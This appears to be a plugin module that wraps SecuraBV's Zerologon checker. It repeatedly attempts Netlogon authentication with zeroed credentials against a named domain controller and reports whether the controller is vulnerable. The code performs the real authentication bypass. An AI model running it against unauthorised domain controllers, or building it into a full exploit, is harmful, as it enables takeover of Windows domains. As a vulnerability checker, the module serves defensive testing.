from .internal.base import Gather

class ZeroLogon(Gather):
    def __init__(self):
        super().__init__()
        self.prompt = "[ZeroLogon] -> "

        self.info["Author"] = "SecuraBV"
        self.info["Author Repo"] = "https://github.com/SecuraBV"
        self.info["description"] = "Zerologon vulnerability checker"

        self.pip_dependencies = [
            "cffi==1.14.2",
            "click==7.1.2",
            "cryptography==3.1",
            "dnspython==2.0.0",
            "Flask==1.1.2",
            "future==0.18.2",
            "impacket==0.9.21",
            "itsdangerous==1.1.0",
            "Jinja2==2.11.2",
            "ldap3==2.8",
            "ldapdomaindump==0.9.3",
            "MarkupSafe==1.1.1",
            "pyasn1==0.4.8",
            "pycparser==2.20",
            "pycryptodomex==3.9.8",
            "pyOpenSSL==19.1.0",
            "six==1.15.0",
            "Werkzeug==1.0.1"
        ] 

        self.args = {
            "dc_name":
                { "description": "domain controller name",
                    "required": True },
            "dc_ip": 
                { "description": "domain controller IP",
                    "required": True }
        }

        for arg in self.args.keys():
            self.__dict__[arg] = "N/a"


    def run(self):
        from impacket.dcerpc.v5 import nrpc, epm
        from impacket.dcerpc.v5.dtypes import NULL
        from impacket.dcerpc.v5 import transport
        from impacket import crypto

        import hmac, hashlib, struct, sys, socket, time
        from binascii import hexlify, unhexlify
        from subprocess import check_call

        try:
            def fail(msg):
                print(msg, file=sys.stderr)
                print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
                return

            def try_zero_authenticate(dc_handle, dc_ip, target_computer):
                binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
                rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
                rpc_con.connect()
                rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

                plaintext = b'\x00' * 8
                ciphertext = b'\x00' * 8
                flags = 0x212fffff

                nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
                try:
                    server_auth = nrpc.hNetrServerAuthenticate3(
                        rpc_con, dc_handle + '\x00',
                        target_computer + '$\x00',
                        nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                        target_computer + '\x00', ciphertext, flags
                    )
                    assert server_auth['ErrorCode'] == 0
                    return rpc_con

                except nrpc.DCERPCSessionError as ex:
                    if ex.get_error_code() == 0xc0000022:
                        return None
                    else:
                        fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
                except BaseException as ex:
                    fail(f'Unexpected error: {ex}.')

            def perform_attack(dc_handle, dc_ip, target_computer):
                print('Performing authentication attempts...')
                rpc_con = None
                for attempt in range(0, self.MAX_ATTEMPTS):  
                    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
                    if rpc_con == None:
                        print('=', end='', flush=True)
                    else:
                        break
                if rpc_con:
                    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
                else:
                    print('\nAttack failed. Target is probably patched.')
                    return

            self.MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
            self.__dict__["dc_name"] = self.__dict__["dc_name"].rstrip('$')
            perform_attack(
                "\\\\" + self.__dict__["dc_name"],
                self.__dict__["dc_ip"],
                self.__dict__["dc_name"]
            )
        except KeyboardInterrupt:
            print('\n')
            return 
